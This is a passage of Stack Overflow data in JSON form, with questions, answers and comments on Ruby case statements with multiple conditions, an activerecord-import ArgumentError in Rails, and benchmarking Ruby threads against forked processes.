"https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1511902690, "post_id": 47539446, "comment_id": 82038747, "body": "@StefanPochmann Something like that is clever, reads well, is narrowly targeted, and doesn&#39;t have a lot of sharp edges so yeah, I&#39;d support that sort of thing."}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1511913670, "post_id": 47539446, "comment_id": 82042952, "body": "Thanks, turned it into an answer now. And thanks for your answer pretty much pointing out exactly what I had to do :-)"}, {"owner": {"reputation": 33, "user_id": 8207059, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cRFIIYFPcHo/AAAAAAAAAAI/AAAAAAAAAQQ/Xky0ucXT7rg/photo.jpg?sz=128", "display_name": "George Tucker", "link": "https://stackoverflow.com/users/8207059/george-tucker"}, "edited": false, "score": 0, "creation_date": 1511984892, "post_id": 47539446, "comment_id": 82078981, "body": "This is really helpful -- made clear I was using [] as <i>punctuation</i> rather than to deliberately create an array. Total rookie mistake."}], "tags": [], "owner": {"reputation": 394580, "user_id": 479863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ArUCE.jpg?s=128&g=1", "display_name": "mu is too short", "link": "https://stackoverflow.com/users/479863/mu-is-too-short"}, "is_accepted": true, "score": 4, "last_activity_date": 1519064835, "last_edit_date": 1519064835, "creation_date": 1511897361, "answer_id": 47539446, "question_id": 47538886, "link": "https://stackoverflow.com/questions/47538886/using-case-with-multiple-conditions/47539446#47539446", "title": "Using &#39;case&#39; with multiple conditions", "body": "<p>You have two problems with your code. First of all, this:</p>\n\n<pre><code>[1..3 &amp;&amp; 1]\n</code></pre>\n\n<p>is an array with one element. Since <code>..</code> has lower precedence than <code>&amp;&amp;</code>, you're really writing <code>1..(3 &amp;&amp; 1)</code> which is just a complicated way of saying <code>1..1</code>. That means that your <code>case</code> is really:</p>\n\n<pre><code>case[roll1, roll2]\n  when [1..1]\n    \"Low / Low\"\n  when [4..1]\n    \"High / Low\"\n  when [1..2]\n    \"Low / High\"\n  when [4..2]\n    \"JACKPOT!!\"\nend\n</code></pre>\n\n<p>The second problem is that <code>Array</code> doesn't override the <code>===</code> operator that <code>case</code> uses so you'll be using <code>Object#===</code> which is just an alias for <code>Object#==</code>. This means that your <code>case</code> is equivalent to:</p>\n\n<pre><code>if([roll1, roll2] == [1..1])\n  \"Low / Low\"\nelsif([roll1, roll2] == [4..1])\n  \"High / Low\"\nelsif([roll1, roll2] == [1..2])\n  \"Low / High\"\nelsif([roll1, roll2] == [4..2])\n  \"JACKPOT!!\"\nend\n</code></pre>\n\n<p><code>[roll1, roll2]</code> will never equal <code>[some_range]</code> because <code>Array#==</code> compares element by element and <code>roll1</code> will never <code>==</code> a range; furthermore, you're also comparing arrays with different sizes.</p>\n\n<p>All that means that you have a complicated way of saying:</p>\n\n<pre><code>result = nil\n</code></pre>\n\n<p>I'd probably just use an <code>if</code> for this:</p>\n\n<pre><code>result = if (1..3).include?(roll1) &amp;&amp; roll2 == 1\n           'Low / Low'\n         elsif (4..6).include?(roll1) &amp;&amp; roll2 == 1\n           'High / Low'\n         ...\n</code></pre>\n\n<p>or you could use <code>===</code> explicitly:</p>\n\n<pre><code>result = if (1..3) === roll1 &amp;&amp; roll2 == 1\n           'Low / Low'\n         elsif (4..6) === roll1 &amp;&amp; roll2 == 1\n           'High / Low'\n         ...\n</code></pre>\n\n<p>but again, watch out for the low precedence of <code>..</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "is_accepted": false, "score": 4, "last_activity_date": 1511914346, "last_edit_date": 1511914346, "creation_date": 1511912862, "answer_id": 47542845, "question_id": 47538886, "link": "https://stackoverflow.com/questions/47538886/using-case-with-multiple-conditions/47542845#47542845", "title": "Using &#39;case&#39; with multiple conditions", "body": "<p>As the other answers explain in more detail, your <code>when [1..3 &amp;&amp; 2]</code> doesn't work because that's actually <code>when [1..2]</code> and because arrays don't compare their elements with <code>===</code> (which <code>when</code> does and which the range would need to do).</p>\n\n<p>Here's another way to make it work, by fixing exactly those two issues.</p>\n\n<p>First, use <code>[1..3, 2]</code> instead of <code>[1..3 &amp;&amp; 2]</code>, so the two conditions don't get combined but stay separated in the array. Then, to get <code>===</code> used, create a subclass of <code>Array</code> that compares elements with <code>===</code> instead of <code>==</code>. And use it in the <code>when</code> condition instead of a normal array. Full code:</p>\n\n<pre><code>roll1 = rand(1..6)\nroll2 = rand(1..2)\n\nclass Case &lt; Array\n  def ===(other)\n    zip(other).all? { |x, y| x === y }\n  end\nend\n\nresult = case[roll1, roll2]\n  when Case[1..3, 1]\n    \"Low / Low\"\n  when Case[4..6, 1]\n    \"High / Low\"\n  when Case[1..3, 2]\n    \"Low / High\"\n  when Case[4..6, 2]\n    \"JACKPOT!!\"\nend\n\nputs roll1, roll2, result\n</code></pre>\n\n<p>That <a href=\"https://ideone.com/Xq6qd7\" rel=\"nofollow noreferrer\">for example prints</a>:</p>\n\n<pre><code>6\n2\nJACKPOT!!\n</code></pre>\n\n<p>I guess whether this is good / worth it for you depends on your actual use case. But I like it. And as a Ruby beginner myself, this little exercise helped me understand better how <code>when</code> and <code>===</code> work.</p>\n\n<p>Also see the discussion under @muistooshort's <a href=\"https://stackoverflow.com/a/47539446/1672429\">answer</a> for some thoughts about this.</p>\n\n<p>And this answer about what <code>===</code> does was also very illuminating:<br>\n<a href=\"https://stackoverflow.com/a/3422349/1672429\">https://stackoverflow.com/a/3422349/1672429</a></p>\n"}, {"tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": false, "score": 0, "last_activity_date": 1511927700, "creation_date": 1511927700, "answer_id": 47544788, "question_id": 47538886, "link": "https://stackoverflow.com/questions/47538886/using-case-with-multiple-conditions/47544788#47544788", "title": "Using &#39;case&#39; with multiple conditions", "body": "<p>Except in the case of <code>\u201cJACKPOT!!\u201d</code> you have two separate problems, which are easier to deal with by treating them separately.</p>\n\n<pre><code>def result_of_rolls(roll1, roll2)\n  if (4..6).cover?(roll1) &amp;&amp; roll2 == 2\n    \"JACKPOT!!\"\n  else\n    \"%s / %s\" % [(1..3).cover?(roll1) ? \"Low\" : \"High\",\n                 roll2 == 1 ? \"Low\" : \"High\"]\n  end\nend\n\nresult_of_rolls(2,1) #=&gt; \"Low / Low\"\nresult_of_rolls(4,1) #=&gt; \"High / Low\"\nresult_of_rolls(3,2) #=&gt; \"Low / High\"\nresult_of_rolls(5,2) #=&gt; \"JACKPOT!!\"\n</code></pre>\n\n<p>If there were three or more rolls, rather than just two, it can be seen that this approach would be much more efficient than one that examined all the combinations of values of <code>roll1</code>, <code>roll2</code>, <code>roll3</code>, and so on.</p>\n"}, {"comments": [{"owner": {"reputation": 33, "user_id": 8207059, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cRFIIYFPcHo/AAAAAAAAAAI/AAAAAAAAAQQ/Xky0ucXT7rg/photo.jpg?sz=128", "display_name": "George Tucker", "link": "https://stackoverflow.com/users/8207059/george-tucker"}, "edited": false, "score": 0, "creation_date": 1512160591, "post_id": 47548107, "comment_id": 82160871, "body": "Just for clarification - this was an artificial MCVE. Original problem was to offer results of a rand(1..100) number with a second dimension, a, b, or c. I didn&#39;t want to write 3 different case statements duplicating results. Then I figured out I could write a single case statement by converting the second dimension to an integer, combine with original random number, and use when 1..10 || 101..105 || 201..203 do x. Just for clarification."}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "reply_to_user": {"reputation": 33, "user_id": 8207059, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cRFIIYFPcHo/AAAAAAAAAAI/AAAAAAAAAQQ/Xky0ucXT7rg/photo.jpg?sz=128", "display_name": "George Tucker", "link": "https://stackoverflow.com/users/8207059/george-tucker"}, "edited": false, "score": 0, "creation_date": 1512160917, "post_id": 47548107, "comment_id": 82161016, "body": "@GeorgeTucker Ok, thanks. That&#39;s what I suspected and why I wrote my other answer first. Still sounds similar, though, so maybe some of these solutions could be adapted to it."}], "tags": [], "owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "is_accepted": false, "score": 0, "last_activity_date": 1511952448, "last_edit_date": 1511952448, "creation_date": 1511943841, "answer_id": 47548107, "question_id": 47538886, "link": "https://stackoverflow.com/questions/47538886/using-case-with-multiple-conditions/47548107#47548107", "title": "Using &#39;case&#39; with multiple conditions", "body": "<p>If your example is not just an artificial <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a> for the general case but your actual problem, or if your actual problem is really similar, here are a few more ideas:</p>\n\n<p>Treat as two independent problems, combine, handle the special case:</p>\n\n<pre><code>result = \"#{roll1 &lt; 4 ? 'Low' : 'High'} / #{roll2 &lt; 2 ? 'Low' : 'High'}\".\n           sub('High / High', 'JACKPOT!!')\n</code></pre>\n\n<p>Same idea written differently:</p>\n\n<pre><code>result = [roll1 &lt; 4, roll2 &lt; 2].\n           map { |low| low ? 'Low' : 'High' }.\n           join(' / ').\n           sub('High / High', 'JACKPOT!!')\n</code></pre>\n\n<p>Same again but a bit silly:</p>\n\n<pre><code>result = [roll1 &lt; 4, roll2 &lt; 2].\n           join(' / ').\n           gsub('true', 'Low').gsub('false', 'True').\n           sub('High / High', 'JACKPOT!!')\n</code></pre>\n\n<p>Using booleans because they just need <code>==</code> comparison:</p>\n\n<pre><code>result = case [roll1 &gt; 3, roll2 &gt; 1]\n         when [false, false]\n           \"Low / Low\"\n         when [true, false]\n           \"High / Low\"\n         when [false, true]\n           \"Low / High\"\n         when [true, true]\n           \"JACKPOT!!\"\n         end\n</code></pre>\n\n<p>(<code>case [(4..6) === roll1, roll2 == 2]</code> would work as well. And note I <a href=\"https://github.com/bbatsov/ruby-style-guide#indent-conditional-assignment\" rel=\"nofollow noreferrer\">indented differently</a>.)</p>\n\n<p>Combine the rolls into a single number:</p>\n\n<pre><code>result = case roll1 * (-1)**roll2\n         when -3..-1\n           \"Low / Low\"\n         when -6..-4\n           \"High / Low\"\n         when 1..3\n           \"Low / High\"\n         when 4..6\n           \"JACKPOT!!\"\n         end\n</code></pre>\n\n<p>Same idea written differently:</p>\n\n<pre><code>result = case roll2 * 10 + roll1\n         when 11..13\n           \"Low / Low\"\n         when 14..16\n           \"High / Low\"\n         when 21..23\n           \"Low / High\"\n         when 24..26\n           \"JACKPOT!!\"\n         end\n</code></pre>\n\n<p>Same again, just different code style:</p>\n\n<pre><code>result = case roll1 * (-1)**roll2\n         when -3..-1 then \"Low / Low\"\n         when -6..-4 then \"High / Low\"\n         when  1..3  then \"Low / High\"\n         when  4..6  then \"JACKPOT!!\"\n         end\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 8207059, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cRFIIYFPcHo/AAAAAAAAAAI/AAAAAAAAAQQ/Xky0ucXT7rg/photo.jpg?sz=128", "display_name": "George Tucker", "link": "https://stackoverflow.com/users/8207059/george-tucker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2149, "favorite_count": 0, "accepted_answer_id": 47539446, "answer_count": 5, "score": 3, "last_activity_date": 1519064835, "creation_date": 1511895054, "last_edit_date": 1511989706, "question_id": 47538886, "link": "https://stackoverflow.com/questions/47538886/using-case-with-multiple-conditions", "title": "Using &#39;case&#39; with multiple conditions", "body": "<p>I'm trying to write a case statement which looks at two conditions, like this:</p>\n\n<pre><code>roll1 = rand(1..6)\nroll2 = rand(1..2)\n\nresult = case[roll1, roll2]\n  when [1..3 &amp;&amp; 1]\n    \"Low / Low\"\n  when [4..6 &amp;&amp; 1]\n    \"High / Low\"\n  when [1..3 &amp;&amp; 2]\n    \"Low / High\"\n  when [4..6 &amp;&amp; 2]\n    \"JACKPOT!!\"\nend\n\nputs result\n</code></pre>\n\n<p>I'd love to get this working. I'd prefer to understand why my example fails.</p>\n\n<p><strong>Edited to add:</strong></p>\n\n<p>Thanks for all the feedback! Inspired, I realized that combining the two case variables allows me to collapse them into a single value for a simple switch statement...</p>\n\n<pre><code>roll1 = rand(1..6)\nroll2 = rand(1..2)\n\nif roll2 == 1\n  roll2 = 10\nelsif roll2 == 2\n  roll2 = 20\nend\n\nresult = case(roll1 + roll2)\n  when 11..13\n    \"Low / Low\"\n  when 14..16\n    \"High / Low\"\n  when 21..23\n    \"Low / High\"\n  when 24..26\n    \"JACKPOT!!\"\nend\n\nputs result\n</code></pre>\n\n<p>While this solves my immediate problem, it doesn't advance my underlying knowledge -- it's a trifling insight compared to all the awesome feedback I've received. Sincere thanks!</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "activerecord", "activerecord-import"], "answers": [{"tags": [], "owner": {"reputation": 1325, "user_id": 3295284, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdP8.jpg?s=128&g=1", "display_name": "patkoperwas", "link": "https://stackoverflow.com/users/3295284/patkoperwas"}, "is_accepted": true, "score": 2, "last_activity_date": 1511895786, "creation_date": 1511895786, "answer_id": 47539064, "question_id": 47538808, "link": "https://stackoverflow.com/questions/47538808/activerecord-import-getting-argumenterror-invalid-arguments-error/47539064#47539064", "title": "Activerecord-import getting ArgumentError: Invalid arguments! error", "body": "<p>If you look at the <a href=\"https://github.com/zdennis/activerecord-import/wiki/Examples#import-using-columns-and-arrays\" rel=\"nofollow noreferrer\">Documentation for ActiveRecord Import</a>, the method you are using takes an array of columns as the first argument (which you have) and the second argument is an array of arrays, where each array has the values you want to insert.</p>\n\n<p>Your <code>values</code> variable is an array of hashes, so you'll need to convert it like so</p>\n\n<pre><code>values = values.map(&amp;:values)\nputs values\n#=&gt; [[\"xxx\", \"2017-11-28 20:42:57\", 41.9322, 27.3253, 0, 198404, true, \"address\"], [\"xxx\", \"2017-11-28 20:43:46\", 47.0148, 39.1805, 16, 209726, true, \"address\"]]\n</code></pre>\n\n<p>For each hash in <code>values</code> we call <a href=\"https://ruby-doc.org/core-2.4.2/Hash.html#method-i-values\" rel=\"nofollow noreferrer\">Hash#values</a> - which returns a new array of just the values in the hash.</p>\n\n<p>Or, just use <a href=\"https://github.com/zdennis/activerecord-import/wiki/Examples#import-using-hashes\" rel=\"nofollow noreferrer\">this version of #import</a> which takes a hash.</p>\n\n<pre><code>values = [{\"plate\":\"xxx\",\"timestamp\":\"2017-11-28 \n 20:42:57\",\"latitude\":41.9322,\"longitude\":27.3253,\"speed\":0,\"mileage\":1984\n 04,\"ignition_on\":true,\"address\":\"address\"},{\"plate\":\"xxx\",\"timestamp\":\"2017-11-28 20:43:46\",\"latitude\":47.0148,\"longitude\":39.1805,\"speed\":16,\"mileage\":209726,\"ignition_on\":true,\"address\":\"address\"}]\n\nVehicleLocation.import values\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1215, "user_id": 2824935, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/dkDTX.jpg?s=128&g=1", "display_name": "garythegoat", "link": "https://stackoverflow.com/users/2824935/garythegoat"}, "is_accepted": false, "score": 1, "last_activity_date": 1511896136, "creation_date": 1511896136, "answer_id": 47539143, "question_id": 47538808, "link": "https://stackoverflow.com/questions/47538808/activerecord-import-getting-argumenterror-invalid-arguments-error/47539143#47539143", "title": "Activerecord-import getting ArgumentError: Invalid arguments! error", "body": "<p>You should be able to modify your code as follows:</p>\n\n<pre><code>locations = values.map do |attrs|\n  VehicleLocation.new(attrs)\nend\n\nVehicleLocation.import(locations)\n</code></pre>\n\n<p>As shown in <a href=\"https://github.com/zdennis/activerecord-import/wiki/Examples#import-using-activerecord-models\" rel=\"nofollow noreferrer\">the docs</a></p>\n"}], "owner": {"reputation": 755, "user_id": 258414, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/dc940ac471181e003c83210298373635?s=128&d=identicon&r=PG", "display_name": "onder", "link": "https://stackoverflow.com/users/258414/onder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1672, "favorite_count": 0, "accepted_answer_id": 47539064, "answer_count": 2, "score": 5, "last_activity_date": 1511896136, "creation_date": 1511894804, "last_edit_date": 1511895400, "question_id": 47538808, "link": "https://stackoverflow.com/questions/47538808/activerecord-import-getting-argumenterror-invalid-arguments-error", "title": "Activerecord-import getting ArgumentError: Invalid arguments! error", "body": "<p>I am trying to import with activerecord import. I am getting Invalid arguments error how can I fix this?</p>\n\n<p>Thanks</p>\n\n<p>My table schema in postgresql:</p>\n\n<pre><code>create_table \"vehicle_locations\", force: :cascade do |t|\nt.string \"plate\"\nt.datetime \"timestamp\"\nt.float \"latitude\"\nt.float \"longitude\"\nt.integer \"speed\"\nt.integer \"mileage\"\nt.boolean \"ignition_on\"\nt.string \"address\"\nend\n</code></pre>\n\n<p>and I am trying to import with following code:</p>\n\n<pre><code>values = [{\"plate\":\"xxx\",\"timestamp\":\"2017-11-28 \n 20:42:57\",\"latitude\":41.9322,\"longitude\":27.3253,\"speed\":0,\"mileage\":1984\n 04,\"ignition_on\":true,\"address\":\"address\"},{\"plate\":\"xxx\",\"timestamp\":\"2017-11-28 20:43:46\",\"latitude\":47.0148,\"longitude\":39.1805,\"speed\":16,\"mileage\":209726,\"ignition_on\":true,\"address\":\"address\"}]\n\n   columns = [:plate, :timestamp, :latitude, :longitude, :speed, :mileage, :ignition_on,  :address ]\n  VehicleLocation.import columns, values\n</code></pre>\n\n<p>I am using postgresql, rails 5.1.</p>\n\n<p>Thanks in advance.</p>\n\n<pre><code> 2017-11-28T17:45:08.844Z 17976 TID-gn4tnwlkc WARN: ArgumentError: Invalid arguments!\n2017-11-28T17:45:08.844Z 17976 TID-gn4tnwlkc WARN: /home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/activerecord-import-0.21.0/lib/activerecord-import/import.rb:508:in `import_helper'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/activerecord-import-0.21.0/lib/activerecord-import/import.rb:399:in `import'\n/home/kayayan/Projects/RoR/trasportapp/app/workers/trio_worker.rb:23:in `perform'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:188:in `execute_job'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:170:in `block (2 levels) in process'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/middleware/chain.rb:128:in `block in invoke'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/middleware/chain.rb:133:in `invoke'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:169:in `block in process'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:141:in `block (6 levels) in dispatch'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/job_retry.rb:97:in `local'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:140:in `block (5 levels) in dispatch'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/rails.rb:42:in `block in call'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/activesupport-5.1.4/lib/active_support/execution_wrapper.rb:85:in `wrap'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/activesupport-5.1.4/lib/active_support/reloader.rb:68:in `block in wrap'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/activesupport-5.1.4/lib/active_support/execution_wrapper.rb:85:in `wrap'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/activesupport-5.1.4/lib/active_support/reloader.rb:67:in `wrap'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/rails.rb:41:in `call'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:136:in `block (4 levels) in dispatch'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:204:in `stats'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:131:in `block (3 levels) in dispatch'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/job_logger.rb:7:in `call'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:130:in `block (2 levels) in dispatch'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/job_retry.rb:72:in `global'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:129:in `block in dispatch'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/logging.rb:44:in `with_context'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/logging.rb:38:in `with_job_hash_context'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:128:in `dispatch'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:168:in `process'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:85:in `process_one'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/processor.rb:73:in `run'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/util.rb:16:in `watchdog'\n/home/kayayan/.rbenv/versions/2.4.2/lib/ruby/gems/2.4.0/gems/sidekiq-5.0.5/lib/sidekiq/util.rb:25:in `block in safe_thread'\n</code></pre>\n"}, {"tags": ["ruby", "multithreading", "fork", "cpu"], "comments": [{"owner": {"reputation": 56502, "user_id": 271475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b00f41e5f2a69734051f2a78f4f3785?s=128&d=identicon&r=PG", "display_name": "Chris Heald", "link": "https://stackoverflow.com/users/271475/chris-heald"}, "edited": false, "score": 0, "creation_date": 1511893576, "post_id": 47538354, "comment_id": 82033843, "body": "Forking is not threading, and all you&#39;re doing is forking off a process and then sleeping it - you&#39;re not actually doing any computational work. What you&#39;re observing in your 500 iterations test is probably the overhead cost of forking new processes. What exactly are you trying to test?"}, {"owner": {"reputation": 284, "user_id": 6788679, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/e9e9a74322f5366b889d834c73afef73?s=128&d=identicon&r=PG&f=1", "display_name": "jacksonecac", "link": "https://stackoverflow.com/users/6788679/jacksonecac"}, "reply_to_user": {"reputation": 56502, "user_id": 271475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b00f41e5f2a69734051f2a78f4f3785?s=128&d=identicon&r=PG", "display_name": "Chris Heald", "link": "https://stackoverflow.com/users/271475/chris-heald"}, "edited": false, "score": 0, "creation_date": 1511893652, "post_id": 47538354, "comment_id": 82033878, "body": "@ChrisHeald should I modify my script to use Threads instead and run try testing that then?"}, {"owner": {"reputation": 56502, "user_id": 271475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b00f41e5f2a69734051f2a78f4f3785?s=128&d=identicon&r=PG", "display_name": "Chris Heald", "link": "https://stackoverflow.com/users/271475/chris-heald"}, "edited": false, "score": 0, "creation_date": 1511894105, "post_id": 47538354, "comment_id": 82034110, "body": "It depends on what you&#39;re actually trying to test. So far it&#39;s unclear - you have to be doing some kind of work to test parallelism. You can sleep as many processes or threads as you can spawn."}, {"owner": {"reputation": 284, "user_id": 6788679, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/e9e9a74322f5366b889d834c73afef73?s=128&d=identicon&r=PG&f=1", "display_name": "jacksonecac", "link": "https://stackoverflow.com/users/6788679/jacksonecac"}, "reply_to_user": {"reputation": 56502, "user_id": 271475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b00f41e5f2a69734051f2a78f4f3785?s=128&d=identicon&r=PG", "display_name": "Chris Heald", "link": "https://stackoverflow.com/users/271475/chris-heald"}, "edited": false, "score": 0, "creation_date": 1511894220, "post_id": 47538354, "comment_id": 82034157, "body": "@ChrisHeald I am trying to demonstrate some the benefit of multithreading versus singlethreading by performing the same action under both circumstances."}, {"owner": {"reputation": 71199, "user_id": 1301972, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/T5G7N.jpg?s=128&g=1", "display_name": "Todd A. Jacobs", "link": "https://stackoverflow.com/users/1301972/todd-a-jacobs"}, "edited": false, "score": 0, "creation_date": 1511894813, "post_id": 47538354, "comment_id": 82034461, "body": "Other issues aside, MRI doesn&#39;t use multiple cores. You&#39;d need to use JRuby or Rubinius to take advantage of real parallelism."}], "answers": [{"tags": [], "owner": {"reputation": 56502, "user_id": 271475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b00f41e5f2a69734051f2a78f4f3785?s=128&d=identicon&r=PG", "display_name": "Chris Heald", "link": "https://stackoverflow.com/users/271475/chris-heald"}, "is_accepted": true, "score": 2, "last_activity_date": 1511895386, "last_edit_date": 1511895386, "creation_date": 1511895076, "answer_id": 47538890, "question_id": 47538354, "link": "https://stackoverflow.com/questions/47538354/ruby-multithreading-timing-versus-cpu-core-count/47538890#47538890", "title": "Ruby Multithreading timing versus cpu core count", "body": "<p>To measure concurrency, you'll need to do some work. Here's an implementation which computes the Fibbinaci sequence (in an intentionally slow manner).</p>\n\n<pre><code>require 'thread'\nrequire 'benchmark'\n\ndef fibbinaci(n=33)\n  return n if n &lt;= 1\n  fibbinaci(n-1) + fibbinaci(n-2)\nend\n\nLOOPS = 5\n\nBenchmark.bm do |x|\n  x.report(\"Single threaded\") do\n    LOOPS.times { fibbinaci }\n  end\n\n  x.report(\"Multithreaded\") do\n    LOOPS.times.map do\n      Thread.new { fibbinaci }\n    end.each(&amp;:join)\n  end\n\n  x.report(\"Forked\") do\n    LOOPS.times do\n      fork do\n        fibbinaci\n      end\n    end\n    Process.waitall\n  end unless RUBY_PLATFORM == \"java\"\nend\n</code></pre>\n\n<p>This gives something like:</p>\n\n<pre><code>$ ruby fib.rb\n                 user       system     total    real\nSingle threaded  4.050000   0.000000   4.050000 (  4.054188)\nMultithreaded    4.100000   0.000000   4.100000 (  4.114595)\nForked           0.000000   0.000000   4.000000 (  2.054361)\n</code></pre>\n\n<p>This is expected - Ruby uses green threads, which means that a single Ruby process can't consume more than 1 CPU core at a time. My machine has 2 cores, so it runs roughly twice as fast when forking (permitting for forking overhead).</p>\n\n<p>If I run this under JRuby, which <em>does</em> have native threads (ie, actual in-process concurrency) I get something like:</p>\n\n<pre><code>$ ruby fib.rb\n                user        system    total     real\nSingle threaded 27.850000   0.100000  27.950000 ( 27.812978)\nMultithreaded   27.870000   0.060000  27.930000 ( 14.355506)\n</code></pre>\n\n<p>The in-process threads do halve the runtime of the task (though, yikes, that appears to be one that JRuby is particularly bad at).</p>\n\n<p>You might wonder why Ruby would offer threading if it can't use more than one core per process - it's because you can still do work across threads when waiting on IO! If you have an application that spends a lot of time talking to network sockets (eg making database queries) then you will see concurrency gains from multithreading by letting other threads work while you're blocking on a socket.</p>\n"}], "owner": {"reputation": 284, "user_id": 6788679, "user_type": "registered", "accept_rate": 60, "profile_image": 